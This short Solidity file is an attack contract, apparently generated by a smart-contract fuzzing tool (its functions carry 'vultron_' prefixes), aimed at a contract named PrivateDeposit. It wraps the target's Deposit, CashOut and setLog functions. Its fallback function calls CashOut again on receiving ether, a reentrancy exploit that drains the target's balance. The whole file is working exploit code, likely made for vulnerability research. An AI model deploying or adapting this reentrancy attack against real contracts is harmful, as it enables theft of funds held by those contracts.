pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/PrivateDeposit.sol";

contract Attack_PrivateDeposit0 {

  PrivateDeposit public target_contract;

  function Attack_PrivateDeposit0(address _targetContract) public payable {
      target_contract = PrivateDeposit(_targetContract);
  } 

  function vultron_setLog(address _lib) public {
    target_contract.setLog(_lib);
  } 

  function vultron_CashOut(uint256 _am) public {
    target_contract.CashOut(_am);
  } 

  function vultron_Deposit(uint256 vultron_amount) public payable{
    target_contract.Deposit.value(vultron_amount)();
  } 

      function() public payable {
        
        target_contract.CashOut(10000);
      }
      } 
